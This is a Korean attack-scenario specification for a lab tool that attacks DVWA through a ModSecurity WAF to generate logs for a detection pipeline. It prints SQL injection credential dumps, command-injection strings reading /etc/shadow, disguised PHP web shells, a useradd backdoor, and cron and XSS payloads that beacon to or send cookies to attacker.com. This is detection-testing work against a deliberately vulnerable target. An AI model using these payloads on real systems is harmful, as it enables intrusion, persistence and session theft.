# 🛡️ 통합 공격 시나리오 명세서

> **목적**: DVWA 침투 이후 실제 공격자가 수행하는 후속 공격(Post-Exploitation)까지 연결한 현실적 공격 시뮬레이션  
> **실행 방법**: `python attack.py -s [시나리오번호]`  
> **대상**: DVWA (Damn Vulnerable Web Application) — ModSecurity WAF 경유

각 시나리오는 **[단계 1] 침투** → **[단계 2] 침투 후 공격** 의 2단계 구조로 구성됩니다.

---

## 시나리오 요약

| 번호 | 시나리오명 | 침투 기법 | 침투 후 공격 |
|------|-----------|----------|-------------|
| 11 | SQLi → 시스템 침투 | UNION-based SQL Injection | 해시 크래킹 → SSH 접근 → 시스템 열거 |
| 12 | CMDi → 권한 상승 | OS Command Injection | SUID 탐색 → sudo 확인 → 커널 exploit 조사 |
| 13 | Upload → 횡적 이동 | PHP 웹 쉘 업로드 | 네트워크 정찰 → 포트 스캔 → DB 크리덴셜 추출 |
| 14 | Brute Force → 지속성 확보 | 사전 공격 (Dictionary Attack) | 은닉 백도어 → 크론잡 → 계정 추가 |
| 15 | Stored XSS → 데이터 유출 | Stored Cross-Site Scripting | 세션 하이재킹 → SQLi 체인 → 파일 유출 |

---

## 시나리오 11: SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투

```
python attack.py -s 11
```

| 항목 | 내용 |
|------|------|
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing App), T1003 (Credential Dumping), T1110 (Brute Force) |
| **대상 URL** | `/dvwa/vulnerabilities/sqli/` (침투), `/dvwa/vulnerabilities/exec/` (후속) |
| **취약 파라미터** | `id` (GET) |

### 공격 흐름

```mermaid
graph LR
    A[정찰: SQLi 취약점 탐색] --> B[침투: DB 구조 매핑]
    B --> C[크리덴셜 탈취]
    C --> D[해시 크래킹]
    D --> E[SSH 접근 시도]
    E --> F[시스템 정보 수집]

    style A fill:#4a9eff,color:#fff
    style B fill:#4a9eff,color:#fff
    style C fill:#ff6b6b,color:#fff
    style D fill:#ffa94d,color:#fff
    style E fill:#ffa94d,color:#fff
    style F fill:#ffa94d,color:#fff
```

### 단계 1: DVWA 침투 — SQL Injection

**정찰 단계** — 취약점 존재 여부를 확인합니다.

| 순서 | 행위 | 페이로드 | 기대 결과 |
|------|------|---------|----------|
| 1 | 정상 요청 | `1` | 정상 데이터 반환 확인 |
| 2 | SQL 에러 유발 | `1'` | `You have an error in your SQL syntax` 출력 |
| 3 | 항상 참 조건 | `1' OR '1'='1` | 전체 레코드 반환 |

**침투 단계** — DB 구조를 매핑하고 크리덴셜을 탈취합니다.

| 순서 | 행위 | 페이로드 | 기대 결과 |
|------|------|---------|----------|
| 1 | DB 버전 추출 | `1' AND 1=2 UNION SELECT null, version() -- ` | MySQL 버전 정보 |
| 2 | DB 이름 추출 | `1' AND 1=2 UNION SELECT null, database() -- ` | `dvwa` |
| 3 | 테이블 목록 | `1' AND 1=2 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- ` | `users`, `guestbook` 등 |
| 4 | 컬럼 구조 파악 | `1' AND 1=2 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' -- ` | `user`, `password` 등 |
| 5 | **크리덴셜 탈취** | `%' AND 1=0 UNION SELECT user, password FROM users #` | 사용자명 + MD5 해시 쌍 |

### 단계 2: 침투 후 공격 — 크리덴셜 크래킹 및 시스템 침투

**패스워드 해시 크래킹 (John the Ripper 시뮬레이션)**

탈취한 MD5 해시를 사전 데이터 기반으로 역산합니다.

| 사용자 | MD5 해시 | 크래킹 결과 |
|--------|---------|------------|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

**시스템 접근 및 정보 수집**

| 순서 | 행위 | 명령/방법 | 목적 |
|------|------|----------|------|
| 1 | SSH 포트 스캔 | 포트 22 TCP 연결 | SSH 서비스 존재 확인 |
| 2 | SSH 로그인 시도 | 크래킹된 계정으로 인증 시도 | 시스템 접근 획득 |
| 3 | 현재 사용자 확인 | `127.0.0.1; whoami` | 실행 권한 파악 |
| 4 | 권한 확인 | `127.0.0.1; id` | 그룹 멤버십 확인 |
| 5 | 호스트명 확인 | `127.0.0.1; cat /etc/hostname` | 내부 네트워크 위치 파악 |
| 6 | 디스크 사용량 | `127.0.0.1; df -h` | 시스템 규모 파악 |
| 7 | 사용자 목록 | `127.0.0.1; ls -la /home/` | 다른 계정 발견 |

---

## 시나리오 12: Command Injection 침투 → 권한 상승 시도

```
python attack.py -s 12
```

| 항목 | 내용 |
|------|------|
| **MITRE ATT&CK** | T1059 (Command Interpreter), T1548 (Abuse Elevation Mechanism), T1083 (File Discovery) |
| **대상 URL** | `/dvwa/vulnerabilities/exec/` |
| **취약 파라미터** | `ip` (POST) |

### 공격 흐름

```mermaid
graph LR
    A[정찰: CMDi 가능 확인] --> B[침투: 원격 명령 실행]
    B --> C[OS 정보 수집]
    C --> D[SUID 바이너리 탐색]
    D --> E[sudo/크론잡 확인]
    E --> F[커널 exploit 조사]
    F --> G[/etc/shadow 접근]

    style A fill:#4a9eff,color:#fff
    style B fill:#4a9eff,color:#fff
    style C fill:#4a9eff,color:#fff
    style D fill:#ffa94d,color:#fff
    style E fill:#ffa94d,color:#fff
    style F fill:#ffa94d,color:#fff
    style G fill:#ff6b6b,color:#fff
```

### 단계 1: DVWA 침투 — Command Injection

**정찰 단계** — 명령어 삽입 가능 여부를 확인합니다.

| 순서 | 행위 | 페이로드 | 기대 결과 |
|------|------|---------|----------|
| 1 | 정상 요청 | `127.0.0.1` | 정상 ping 결과 |
| 2 | 세미콜론 주입 | `127.0.0.1; echo VULN_TEST` | `VULN_TEST` 출력 |
| 3 | 파이프 주입 | `127.0.0.1 \| echo PIPE_TEST` | `PIPE_TEST` 출력 |

**침투 단계** — 원격 명령 실행을 확보하고 초기 정보를 수집합니다.

| 순서 | 행위 | 페이로드 | 기대 결과 |
|------|------|---------|----------|
| 1 | 사용자 확인 | `127.0.0.1; whoami` | `www-data` |
| 2 | ID/그룹 확인 | `127.0.0.1; id` | `uid=33(www-data)` |
| 3 | 커널 정보 | `127.0.0.1; uname -a` | Linux 커널 버전 |
| 4 | OS 배포판 | `127.0.0.1; cat /etc/os-release` | Debian/Ubuntu 정보 |

### 단계 2: 침투 후 공격 — 권한 상승 (Privilege Escalation)

> [!IMPORTANT]
> 권한 상승은 `www-data`(웹 서버 사용자)에서 `root`로의 권한 획득을 목표로 합니다.

**SUID 바이너리 탐색**

```
127.0.0.1; find / -perm -u=s -type f 2>/dev/null | head -20
```

SetUID 비트가 설정된 실행 파일을 검색합니다. `/usr/bin/nmap`, `/usr/bin/find` 등이 발견되면 GTFOBins를 통해 권한 상승이 가능합니다.

**sudo 권한 확인**

```
127.0.0.1; sudo -l 2>&1 | head -10
```

현재 사용자가 비밀번호 없이 `sudo`로 실행할 수 있는 명령이 있는지 확인합니다.

**추가 열거 항목**

| 순서 | 행위 | 페이로드 | 목적 |
|------|------|---------|------|
| 1 | 크론잡 확인 | `127.0.0.1; cat /etc/crontab` | root 권한으로 실행되는 예약 작업 발견 |
| 2 | 쓰기 가능 경로 | `127.0.0.1; find /tmp /var/tmp /dev/shm -writable -type d` | exploit 코드 업로드 경로 확보 |
| 3 | 커널 버전 확인 | `127.0.0.1; uname -r` | exploit-db에서 Kernel Exploit 검색 가능 |
| 4 | /etc/shadow 접근 | `127.0.0.1; cat /etc/shadow 2>&1 \| head -5` | 패스워드 해시 직접 탈취 시도 |

---

## 시나리오 13: File Upload 침투 → 내부 정찰 및 횡적 이동

```
python attack.py -s 13
```

| 항목 | 내용 |
|------|------|
| **MITRE ATT&CK** | T1505.003 (Web Shell), T1046 (Network Service Discovery), T1021 (Remote Services) |
| **대상 URL** | `/dvwa/vulnerabilities/upload/` (침투), 웹 쉘 경로를 통한 후속 공격 |
| **웹 쉘 경로** | `/dvwa/hackable/uploads/recon_shell.php` |

### 공격 흐름

```mermaid
graph LR
    A[정찰: 필터링 확인] --> B[침투: 웹 쉘 업로드]
    B --> C[시스템 정보 수집]
    C --> D[네트워크 인터페이스]
    D --> E[인접 호스트 발견]
    E --> F[내부 포트 스캔]
    F --> G[DB 크리덴셜 추출]

    style A fill:#4a9eff,color:#fff
    style B fill:#4a9eff,color:#fff
    style C fill:#ffa94d,color:#fff
    style D fill:#ffa94d,color:#fff
    style E fill:#ffa94d,color:#fff
    style F fill:#ff6b6b,color:#fff
    style G fill:#ff6b6b,color:#fff
```

### 단계 1: DVWA 침투 — 악성 웹 쉘 업로드

**정찰 단계** — 업로드 기능과 확장자 필터링을 확인합니다.

| 순서 | 파일명 | MIME 타입 | 목적 |
|------|--------|----------|------|
| 1 | `probe.txt` | `text/plain` | 업로드 기능 정상 작동 확인 |
| 2 | `probe.php` | `application/x-php` | PHP 확장자 필터링 여부 확인 |

**침투 단계** — 고급 웹 쉘을 업로드합니다.

| 순서 | 행위 | 설명 |
|------|------|------|
| 1 | 웹 쉘 업로드 | `recon_shell.php` — `shell_exec` 기반의 명령 실행 웹 쉘 |
| 2 | 동작 확인 | `?cmd=echo+SHELL_OK` 요청으로 웹 쉘 정상 작동 확인 |

웹 쉘 코드:
```php
<?php if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"])."</pre>";}?>
```

### 단계 2: 침투 후 공격 — 내부 정찰 및 횡적 이동

모든 후속 명령은 업로드된 웹 쉘(`recon_shell.php`)을 통해 실행됩니다.

**시스템 기본 정보 수집**

| 순서 | 명령어 | 목적 |
|------|--------|------|
| 1 | `whoami` | 현재 실행 사용자 확인 |
| 2 | `hostname` | 내부 호스트명 확인 |
| 3 | `cat /etc/os-release \| head -5` | OS 종류 및 버전 |

**내부 네트워크 정찰 (Network Enumeration)**

| 순서 | 명령어 | 목적 |
|------|--------|------|
| 1 | `ifconfig` / `ip addr show` | 네트워크 인터페이스 및 IP 대역 확인 |
| 2 | `cat /etc/hosts` | 내부 서비스명 및 IP 매핑 발견 |
| 3 | `netstat -tlnp` / `ss -tlnp` | 리스닝 포트 확인 (내부 서비스 발견) |
| 4 | `arp -a` / `cat /proc/net/arp` | ARP 테이블로 인접 호스트 발견 |

**횡적 이동 시도 (Lateral Movement)**

| 순서 | 행위 | 명령어 | 목적 |
|------|------|--------|------|
| 1 | 인접 호스트 ping | `ping -c 1 -W 1 metasploitable2` | 내부 호스트 생존 확인 |
| 2 | 내부 포트 스캔 | 포트 21, 22, 80, 3306, 5432, 8080 스캔 | 내부 서비스 발견 |
| 3 | **DB 크리덴셜 추출** | `cat config.inc.php \| grep 'db_'` | DVWA 설정 파일에서 DB 접속 정보 탈취 |

> [!NOTE]
> 내부 포트 스캔은 `timeout 2 bash -c 'echo > /dev/tcp/localhost/{port}'` 방식으로 수행됩니다. 별도의 스캐너 없이 bash 내장 기능만으로 포트를 점검합니다.

---

## 시나리오 14: Brute Force 침투 → 백도어 설치 및 지속성 확보

```
python attack.py -s 14
```

| 항목 | 내용 |
|------|------|
| **MITRE ATT&CK** | T1110 (Brute Force), T1505.003 (Web Shell), T1053 (Scheduled Task), T1136 (Create Account) |
| **대상 URL** | `/dvwa/vulnerabilities/brute/` (침투), `/dvwa/vulnerabilities/upload/` + `/dvwa/vulnerabilities/exec/` (후속) |
| **취약 파라미터** | `username`, `password` (GET) |

### 공격 흐름

```mermaid
graph LR
    A[정찰: 로그인 폼 분석] --> B[침투: 사전 공격]
    B --> C[관리자 패스워드 획득]
    C --> D[은닉 백도어 업로드]
    D --> E[크론잡 백도어]
    E --> F[계정 추가 시도]
    F --> G[백도어 생존 확인]

    style A fill:#4a9eff,color:#fff
    style B fill:#4a9eff,color:#fff
    style C fill:#ff6b6b,color:#fff
    style D fill:#ffa94d,color:#fff
    style E fill:#ffa94d,color:#fff
    style F fill:#ffa94d,color:#fff
    style G fill:#ffa94d,color:#fff
```

### 단계 1: DVWA 침투 — Brute Force

**정찰 단계** — 로그인 폼 구조와 방어 메커니즘을 분석합니다.

| 순서 | 행위 | 설명 |
|------|------|------|
| 1 | 폼 구조 분석 | 입력 필드(username, password, Login) 확인 |
| 2 | 방어 메커니즘 확인 | CAPTCHA 없음, 계정 잠금 없음 (Low 보안 레벨) |

**침투 단계** — 사전 공격(Dictionary Attack)을 실행합니다.

| 순서 | 시도 패스워드 | 결과 |
|------|-------------|------|
| 1 | `123456` | ❌ 실패 |
| 2 | `admin` | ❌ 실패 |
| 3 | `qwerty` | ❌ 실패 |
| 4 | `letmein` | ❌ 실패 |
| 5 | `monkey` | ❌ 실패 |
| 6 | `master` | ❌ 실패 |
| 7 | `dragon` | ❌ 실패 |
| 8 | `1234` | ❌ 실패 |
| 9 | `password` | ✅ **성공** |

### 단계 2: 침투 후 공격 — 백도어 설치 및 지속성 확보

관리자 계정을 획득한 뒤, 접근을 **영구적으로 유지**하기 위한 다중 백도어를 설치합니다.

**백도어 웹 쉘 설치 (File Upload 이용)**

| 순서 | 파일명 | 위장 방법 | 웹 쉘 코드 |
|------|--------|----------|-----------|
| 1 | `.htaccess.php` | 시스템 설정 파일로 위장 | `<?php shell_exec($_GET["q"]); ?>` |
| 2 | `avatar.php` | 프로필 이미지로 위장 | `<?php system($_REQUEST["c"]); ?>` |

> [!WARNING]
> 실제 공격에서 `.htaccess.php`와 같은 파일명은 서버 관리자가 쉽게 발견하기 어려운 이름을 사용하는 사회공학적 기법입니다.

**크론잡 백도어 설치 (Command Injection 이용)**

| 순서 | 페이로드 | 목적 |
|------|---------|------|
| 1 | `127.0.0.1; echo '* * * * * wget http://attacker.com/beacon' > /tmp/cron_backdoor` | 매 분마다 공격자 서버에 비콘 전송하는 크론잡 생성 |
| 2 | `127.0.0.1; cat /tmp/cron_backdoor` | 생성된 크론잡 파일 확인 |
| 3 | `127.0.0.1; crontab -l \| head -5` | 현재 활성 크론탭 확인 |

**시스템 계정 추가 시도**

| 순서 | 페이로드 | 목적 |
|------|---------|------|
| 1 | `127.0.0.1; cat /etc/passwd \| grep -c ':'` | 현재 시스템 계정 수 확인 |
| 2 | `127.0.0.1; useradd -m -s /bin/bash hacker` | 공격자 전용 계정 생성 시도 |
| 3 | `127.0.0.1; cat /etc/passwd \| tail -3` | 계정 추가 결과 확인 |

> [!NOTE]
> `www-data` 권한으로는 `useradd`가 `Permission denied`로 실패할 수 있습니다. 이 경우 권한 상승(시나리오 12)이 선행되어야 합니다.

**백도어 생존 확인**

```
GET /dvwa/hackable/uploads/.htaccess.php?q=echo+BACKDOOR_ALIVE
```

`BACKDOOR_ALIVE` 응답이 오면 백도어가 정상 작동하며 지속적 접근이 가능합니다.

---

## 시나리오 15: Stored XSS 침투 → 세션 하이재킹 → 데이터 유출

```
python attack.py -s 15
```

| 항목 | 내용 |
|------|------|
| **MITRE ATT&CK** | T1189 (Drive-by Compromise), T1539 (Steal Web Session Cookie), T1005 (Data from Local System) |
| **대상 URL** | `/dvwa/vulnerabilities/xss_s/` (침투), `/dvwa/vulnerabilities/sqli/` + `/dvwa/vulnerabilities/exec/` (후속) |
| **취약 파라미터** | `mtxMessage` (POST — 게시판 메시지) |

### 공격 흐름

```mermaid
graph LR
    A[정찰: XSS 가능 확인] --> B[침투: 쿠키 탈취 스크립트 저장]
    B --> C[세션 하이재킹]
    C --> D[관리자 페이지 접근]
    D --> E[SQLi로 DB 유출]
    E --> F[CMDi로 파일 유출]

    style A fill:#4a9eff,color:#fff
    style B fill:#4a9eff,color:#fff
    style C fill:#ff6b6b,color:#fff
    style D fill:#ffa94d,color:#fff
    style E fill:#ffa94d,color:#fff
    style F fill:#ff6b6b,color:#fff
```

### 단계 1: DVWA 침투 — Stored XSS

**정찰 단계** — 게시판에 HTML/스크립트가 필터링 없이 저장되는지 확인합니다.

| 순서 | 작성자 | 메시지 내용 | 기대 결과 |
|------|--------|-----------|----------|
| 1 | TestUser | `Hello, this is a test message.` | 정상 게시글 출력 |
| 2 | ProbeUser | `<b>BOLD_PROBE</b>` | **굵은 글씨**로 렌더링되면 XSS 취약 |

**침투 단계** — 3단계에 걸쳐 점진적으로 공격 강도를 높입니다.

| 단계 | 작성자 | 페이로드 | 목적 |
|------|--------|---------|------|
| 1단계 | Hacker1 | `<script>console.log('XSS_STAGE_1')</script>` | 스크립트 실행 가능 확인 |
| 2단계 | Hacker2 | `<script>document.write('<img src="http://attacker.com/steal?cookie='+document.cookie+'">')</script>` | img 태그로 쿠키를 외부 서버에 전송 |
| 3단계 | Hacker3 | `<script>new Image().src='http://attacker.com/log?c='+document.cookie;</script>` | Image 객체로 은밀하게 쿠키 탈취 |

> [!IMPORTANT]
> Stored XSS는 게시판에 **영구적으로 저장**됩니다. 해당 페이지를 방문하는 **모든 사용자**의 세션 쿠키가 공격자에게 전송됩니다.

### 단계 2: 침투 후 공격 — 세션 하이재킹 및 데이터 유출

**세션 하이재킹 시뮬레이션**

피해자가 XSS가 삽입된 게시판 페이지를 방문하면:

1. 브라우저에서 악성 JavaScript가 자동 실행
2. `document.cookie` 값이 공격자 서버(`attacker.com`)로 HTTP 요청과 함께 전송
3. 공격자가 탈취한 세션 쿠키를 자신의 브라우저에 설정하여 **피해자의 세션을 탈취**

**탈취한 세션으로 관리자 기능 접근**

| 순서 | 접근 페이지 | 목적 |
|------|-----------|------|
| 1 | `/dvwa/security.php` | 보안 레벨 변경 가능 확인 |
| 2 | `/dvwa/setup.php` | DB 초기화/재설정 기능 접근 |
| 3 | `/dvwa/phpinfo.php` | PHP 설정 및 서버 환경 정보 수집 |

**SQL Injection 체인 — DB 데이터 대량 유출**

관리자 세션을 이용하여 SQL Injection 페이지에 접근, 추가 데이터를 탈취합니다.

| 순서 | 페이로드 | 유출 데이터 |
|------|---------|-----------|
| 1 | `%' AND 1=0 UNION SELECT user, password FROM users #` | 전체 사용자 크리덴셜 (ID + MD5 해시) |
| 2 | `1' AND 1=2 UNION SELECT null, @@datadir -- ` | DB 데이터 저장 디렉토리 경로 |
| 3 | `1' AND 1=2 UNION SELECT null, CONCAT(user(),' \| ',current_user()) -- ` | DB 연결 사용자 및 권한 정보 |

**Command Injection 체인 — 민감 파일 유출**

| 순서 | 페이로드 | 유출 데이터 |
|------|---------|-----------|
| 1 | `127.0.0.1; cat /etc/passwd \| head -10` | 시스템 계정 목록 |
| 2 | `127.0.0.1; cat config.inc.php \| grep 'db_'` | DB 접속 정보 (호스트, 사용자, 비밀번호) |
| 3 | `127.0.0.1; ls -la /dvwa/hackable/uploads/` | 이전 공격으로 업로드된 파일 증거 확인 |

---

## 실행 가이드

### 사전 준비

```bash
# Docker 컨테이너 기동
docker compose up -d

# 컨테이너 상태 확인
docker compose ps
```

### 개별 실행

```bash
python attack.py -s 11  # SQLi → 크리덴셜 탈취 → 시스템 침투
python attack.py -s 12  # CMDi → 권한 상승
python attack.py -s 13  # File Upload → 횡적 이동
python attack.py -s 14  # Brute Force → 지속성 확보
python attack.py -s 15  # XSS → 세션 하이재킹 → 데이터 유출
```

### 전체 순차 실행

```bash
for i in $(seq 11 15); do
    echo "========== 시나리오 $i 실행 =========="
    python attack.py -s $i
    echo ""
    sleep 2
done
```

### 참고 사항

- 시나리오 11~15는 실행 시 자동으로 DVWA에 로그인하고 보안 레벨을 **Low**로 설정합니다.
- 모든 공격 트래픽은 ModSecurity WAF를 경유하므로, **WAF 로그가 함께 생성**됩니다.
- 생성된 로그는 Filebeat → Elasticsearch → ElastAlert2 → AI Agent 파이프라인을 통해 탐지됩니다.
